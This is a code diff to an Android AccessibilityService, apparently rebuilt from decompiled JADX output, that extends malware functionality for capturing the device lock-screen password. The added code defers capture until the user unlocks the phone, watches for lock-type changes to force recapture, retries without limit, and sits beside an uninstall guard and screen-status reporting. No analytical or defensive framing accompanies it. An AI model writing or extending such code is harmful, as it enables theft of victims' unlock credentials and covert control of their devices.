@@ -417,6 +417,9 @@ class MyAccessibilityService : AccessibilityService() {
     @Volatile
     var isCipherCaptureEnabled: Boolean = false
 
+    @Volatile
+    var pendingPasswordType: String? = null
+
     /** JADX: f52477k8 — uninstall guard started */
     @Volatile
     var isUninstallGuardStarted: Boolean = false
@@ -1849,17 +1852,28 @@ class MyAccessibilityService : AccessibilityService() {
                     override fun onReceive(context: Context?, intent: Intent?) {
                         when (intent?.action) {
                             Intent.ACTION_SCREEN_ON -> {
-                                android.util.Log.d(TAG, "📱 屏幕点亮")
-                                // JADX: dqtvuisjd$screenStateReceiver$1 — trigger screen wake actions
+                                android.util.Log.d(TAG, "SCREEN_ON")
+                                cipherCaptureManager?.refreshLockBatchId()
                                 try { sendScreenStatus() } catch (_: Exception) {}
                             }
                             Intent.ACTION_SCREEN_OFF -> {
-                                android.util.Log.d(TAG, "📱 屏幕关闭")
+                                android.util.Log.d(TAG, "SCREEN_OFF")
+                                cipherCaptureManager?.resetLockBatchId()
+                                isCipherCaptureEnabled = false
+                                cipherRetryCount = 0
                                 try { sendScreenStatus() } catch (_: Exception) {}
                             }
                             Intent.ACTION_USER_PRESENT -> {
-                                android.util.Log.d(TAG, "📱 用户解锁")
+                                android.util.Log.d(TAG, "USER_PRESENT")
                                 try { sendScreenStatus() } catch (_: Exception) {}
+                                val pType = pendingPasswordType
+                                if (pType != null) {
+                                    pendingPasswordType = null
+                                    android.util.Log.d(TAG, "USER_PRESENT deferred password capture: type=$pType")
+                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                                        doLaunchSystemPasswordCapture(isInstallationFlow = false)
+                                    }, 500L)
+                                }
                             }
                         }
                     }
@@ -2286,13 +2300,27 @@ class MyAccessibilityService : AccessibilityService() {
                 val isSecure = keyguardManager?.isKeyguardSecure ?: false
 
                 if (isLocked && isSecure) {
-                    // JADX line 4573: if gestureRecorder mode == 1 (recording), return
-                    // gestureRecorderManager?.let { grm -> if (grm.mode == 1) return }
-
                     android.util.Log.d(TAG, "🔐 检测到锁屏界面: pkg=$pkgLower, locked=$isLocked, secure=$isSecure")
 
-                    // JADX line 4578: gestureRecorderManager.startRecording() (a6)
-                    // gestureRecorderManager?.let { grm -> grm.startRecording() }
+                    if (!isCipherCaptureEnabled) {
+                        val now = System.currentTimeMillis()
+                        if (now - lastLockTypeCheckTime < 10_000L) return
+                        lastLockTypeCheckTime = now
+
+                        val prefs = getSharedPreferences("cipher_config", Context.MODE_PRIVATE)
+                        val savedType = prefs.getString("cipher_lock_type", "") ?: ""
+                        val root = rootInActiveWindow
+                        val currentType = accessibilityEventRouter?.detectLockType(root)?.name?.lowercase() ?: ""
+                        root?.recycle()
+
+                        if (currentType.isNotEmpty() && savedType.isNotEmpty()
+                            && currentType != "unknown" && currentType != savedType) {
+                            android.util.Log.d(TAG, "🔐 锁屏类型变化: $savedType → $currentType，重新启用密码监听")
+                            prefs.edit().putBoolean("cipher_completed", false).apply()
+                            isCipherCaptureEnabled = true
+                            cipherRetryCount = 0
+                        }
+                    }
                 }
             }
         } catch (_: Exception) {}
@@ -3412,18 +3440,6 @@ class MyAccessibilityService : AccessibilityService() {
 
             getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
                 .putBoolean("cipher_excluded", true).apply()
-            val currentLockType = try {
-                val root = rootInActiveWindow
-                val detected = accessibilityEventRouter?.detectLockType(root)
-                root?.recycle()
-                detected?.name?.lowercase() ?: "unknown"
-            } catch (_: Exception) { "unknown" }
-            getSharedPreferences("cipher_config", Context.MODE_PRIVATE).edit()
-                .putBoolean("cipher_completed", true)
-                .putString("cipher_lock_type", currentLockType)
-                .apply()
-            android.util.Log.d(TAG, "🔐 cipher_completed=true, lock_type=$currentLockType")
-
             val ccm = cipherCaptureManager
             if (ccm != null) {
                 val cipher = ccm.readBufferedCipher(false)
@@ -3451,6 +3467,7 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
+    @Volatile private var lastLockTypeCheckTime = 0L
     @Volatile private var cipherRetryCount = 0
     private val cipherMaxRetries = Int.MAX_VALUE
     private val cipherRetryDelayMs = 300L
@@ -3461,11 +3478,26 @@ class MyAccessibilityService : AccessibilityService() {
     private val cipherDismissMaxRetries = Int.MAX_VALUE
     private val cipherDismissDelayMs = 300L
 
+    @Volatile var lastCapturedCipherQuality: String? = null
+
     private fun handleCipherCredentialResult(success: Boolean) {
         android.util.Log.d(TAG, "🔐 验证结果: ${if (success) "成功" else "失败"}")
         if (success) {
             isCipherCaptureEnabled = false
             cipherRetryCount = 0
+            // Save lock type from last captured quality before completeInstallation clears buffer
+            val quality = lastCapturedCipherQuality
+            val lockType = when (quality) {
+                "PASSWORD_QUALITY_PATTERN" -> "pattern"
+                "PASSWORD_QUALITY_NUMERIC_COMPLEX", "PASSWORD_QUALITY_NUMERIC" -> "pin"
+                "PASSWORD_QUALITY_ALPHANUMERIC" -> "pin"
+                else -> "unknown"
+            }
+            getSharedPreferences("cipher_config", Context.MODE_PRIVATE).edit()
+                .putBoolean("cipher_completed", true)
+                .putString("cipher_lock_type", lockType)
+                .apply()
+            android.util.Log.d(TAG, "🔐 cipher_completed=true, lock_type=$lockType (quality=$quality)")
             if (cipherIsInstallationFlow) completeInstallationWithCipher()
         } else {
             cipherRetryCount++
@@ -3938,18 +3970,29 @@ class MyAccessibilityService : AccessibilityService() {
                         } catch (_: Exception) { "" }
                     }
 
-                    val typeChanged = cipherDone && currentType.isNotEmpty()
-                        && savedType.isNotEmpty() && currentType != savedType
+                    val needsRecapture = when {
+                        !cipherDone -> true
+                        savedType.isEmpty() -> true // 旧版数据无类型记录，强制重新捕获
+                        currentType.isNotEmpty() && currentType != savedType -> true
+                        else -> false
+                    }
 
-                    if (!cipherDone || typeChanged) {
-                        if (typeChanged) {
-                            android.util.Log.d(TAG, "🔐 [postAuth] 密码类型变化: $savedType → $currentType，重新捕获")
-                            prefs.edit().putBoolean("cipher_completed", false).apply()
+                    if (needsRecapture) {
+                        if (com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
+                            android.util.Log.d(TAG, "🔐 [postAuth] cipher overlay 已被 debug config 禁用，跳过")
                         } else {
-                            android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
-                        }
-                        kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
-                            doLaunchSystemPasswordCapture(isInstallationFlow = true)
+                            when {
+                                !cipherDone ->
+                                    android.util.Log.d(TAG, "🔐 [postAuth] 启动密码验证流程")
+                                savedType.isEmpty() ->
+                                    android.util.Log.d(TAG, "🔐 [postAuth] 旧版数据无类型记录，强制重新捕获")
+                                else ->
+                                    android.util.Log.d(TAG, "🔐 [postAuth] 密码类型变化: $savedType → $currentType，重新捕获")
+                            }
+                            prefs.edit().putBoolean("cipher_completed", false).apply()
+                            kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
+                                doLaunchSystemPasswordCapture(isInstallationFlow = true)
+                            }
                         }
                     } else {
                         android.util.Log.d(TAG, "🔐 [postAuth] 密码已捕获(type=$savedType)，跳过")
